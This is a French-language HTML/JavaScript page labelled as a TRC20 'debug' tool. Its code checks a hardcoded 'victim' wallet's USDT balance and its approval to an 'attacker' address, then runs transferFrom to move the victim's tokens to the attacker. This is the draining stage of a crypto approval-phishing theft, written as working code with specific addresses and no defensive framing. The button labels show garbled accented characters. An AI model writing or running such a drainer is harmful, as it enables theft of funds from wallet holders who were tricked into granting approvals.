<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <title>Debug TRC20 avec ABI explicite</title>
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
  <style>
    body { font-family: monospace; white-space: pre-wrap; }
    button { margin: 5px 0; padding: 10px; width: 100%; font-size: 1.1em; }
    #output { margin-top: 10px; background: #f0f0f0; padding: 10px; height: 300px; overflow-y: auto; border: 1px solid #ccc; }
  </style>
</head>
<body>
  <h2>Debug TRC20 avec ABI explicite</h2>

  <button onclick="checkTronWeb()">üîé V√©rifier √©tat TronLink</button>
  <button onclick="checkBalance()">1Ô∏è‚É£ V√©rifier solde USDT de la victime</button>
  <button onclick="checkAllowance()">2Ô∏è‚É£ V√©rifier autorisation donn√©e</button>
  <button onclick="runTransferFrom()">3Ô∏è‚É£ Ex√©cuter transferFrom</button>

  <div id="output"></div>

  <script>
    // --- PERSONNALISE ---
    const victim = "TB21PeujGEM51zg9CnSpop6EaqZ6ccKx3T";
    const attacker = "THRU2XfxP5vbUm6RPDpo3K7B12JVvYMD41";
    const tokenAddress = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
    const amount = 1 * 1_000_000; // 1 USDT

    const output = document.getElementById("output");
    function log(msg) {
      console.log(msg);
      output.textContent += msg + "\n";
      output.scrollTop = output.scrollHeight;
    }

    // ABI minimale ERC20
    const erc20Abi = [
      {
        "constant":true,
        "inputs":[{"name":"_owner","type":"address"}],
        "name":"balanceOf",
        "outputs":[{"name":"balance","type":"uint256"}],
        "type":"function"
      },
      {
        "constant":true,
        "inputs":[{"name":"_owner","type":"address"},{"name":"_spender","type":"address"}],
        "name":"allowance",
        "outputs":[{"name":"remaining","type":"uint256"}],
        "type":"function"
      },
      {
        "constant":false,
        "inputs":[
          {"name":"_from","type":"address"},
          {"name":"_to","type":"address"},
          {"name":"_value","type":"uint256"}
        ],
        "name":"transferFrom",
        "outputs":[{"name":"success","type":"bool"}],
        "type":"function"
      }
    ];

    async function checkTronWeb() {
      if (window.tronWeb && window.tronWeb.ready) {
        log("‚úÖ TronWeb connect√© !");
        log("Adresse active (base58) : " + window.tronWeb.defaultAddress.base58);
        log("Adresse active (hex) : " + window.tronWeb.defaultAddress.hex);
        log("Node utilis√© : " + window.tronWeb.fullNode.host);
      } else {
        log("‚ùå TronWeb non connect√©. Connecte-toi via TronLink.");
      }
    }

    async function getTokenContract() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        throw new Error("TronWeb non connect√©");
      }
      return await window.tronWeb.contract(erc20Abi, tokenAddress);
    }

    async function checkBalance() {
      try {
        log("‚è≥ V√©rification du solde...");
        const contract = await getTokenContract();
        const balance = await contract.balanceOf(victim).call();
        log(`üí∞ Solde victime (${victim}): ${balance / 1_000_000} USDT`);
      } catch (e) {
        log("‚ùå Erreur checkBalance : " + (e.message || e));
      }
    }

    async function checkAllowance() {
      try {
        log("‚è≥ V√©rification autorisation...");
        const contract = await getTokenContract();
        const allowance = await contract.allowance(victim, attacker).call();
        log(`üîê Autorisation victime ‚Üí attaquant : ${allowance / 1_000_000} USDT`);
      } catch (e) {
        log("‚ùå Erreur checkAllowance : " + (e.message || e));
      }
    }

    async function runTransferFrom() {
      try {
        log("‚è≥ Ex√©cution transferFrom...");
        const contract = await getTokenContract();
        const tx = await contract.transferFrom(victim, attacker, amount).send({
          feeLimit: 2_000_000
        });
        log(`üöÄ transferFrom envoy√©, txID : ${tx}`);
      } catch (e) {
        log("‚ùå Erreur transferFrom : " + (e.message || e));
      }
    }
  </script>
</body>
</html>
